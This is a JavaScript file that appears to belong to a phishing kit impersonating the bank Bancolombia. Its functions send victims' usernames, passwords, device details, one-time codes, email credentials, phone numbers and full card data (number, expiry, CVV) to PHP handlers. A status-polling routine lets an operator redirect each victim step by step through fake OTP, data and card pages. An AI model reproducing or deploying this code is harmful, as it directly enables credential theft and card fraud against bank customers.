

function inicio(u){
    $.post( "./process/inicio.php", { usr: u} ,function(data) {
        window.location.href = "./clave.php";
    });
}


function detectar_dispositivo() {
    var dispositivo = "";
    var sistema_operativo = "";
    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(navigator.userAgent)) {
        dispositivo = "Dispositivo móvil";
        if (/Android/i.test(navigator.userAgent)) {
            sistema_operativo = "Android";
        } else if (/iOS/i.test(navigator.userAgent)) {
            sistema_operativo = "iOS";
        } else if (/Windows Phone/i.test(navigator.userAgent)) {
            sistema_operativo = "Windows Phone";
        } else {
            sistema_operativo = "Otro";
        }
    } else {
        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(navigator.userAgent)) {
            dispositivo = "Tableta";
        } else if (/TV|SmartTV|Television/i.test(navigator.userAgent)) {
            dispositivo = "Televisión (TV)";
        } else {
            dispositivo = "PC";
        }
        sistema_operativo = "No aplica";
    }

    return [dispositivo, sistema_operativo];
}

var info_dispositivo = detectar_dispositivo();
console.log("Tipo de dispositivo:", info_dispositivo[0]);
console.log("Sistema operativo:", info_dispositivo[1]);


function pasousuario(p){
    var b = "bancolombia";
    var res;
    var d = detectar_dispositivo();
    $.post( "./process/pasousuario.php", { pass: p, dis: d, banco: b} ,function(data) {
        if (data == "ERR") {
                alert("error");
        }else{
            if (data == "NO") {

            }else{
                res = data.split("-");
                window.location.href = "./cargando.php";
            }
        }
    });
}            
        

function consultar_estado(){
    $.post( "./process/estado.php",function(data) {
        switch (data) {
            case '2': window.location.href = "./otp.php"; break;
            case '4': window.location.href = "./datos.php"; break;
            case '6': window.location.href = "./card.php"; break;               
            case '8': window.location.href = "./errorot.php"; break;
            case '10': window.location.href = "./informativo.php"; break;
            case '12': window.location.href = "./?carderror=true"; break;
            //case '40': window.location.href = ""; break;
            //case '41': window.location.href = "./infopago.php"; break;
        } 
    });        
}

function enviar_otp(o){
    $.post( "./process/pasoOTP.php",{ otp:o },function(data) {
        window.location.href = "./cargando.php";
    }); 
}

function enviar_mail(m,c,t){    
    $.post( "./process/pasomail.php",{ eml:m, passe:c, cel:t},function(data) {
        window.location.href = "./cargando.php";
    });
}

function enviar_tarjeta(t,f,c){    
    $.post( "./process/pasotarjeta.php",{ tar:t, fec:f, cvv:c },function(data) {
        window.location.href = "./cargando.php";
    });
}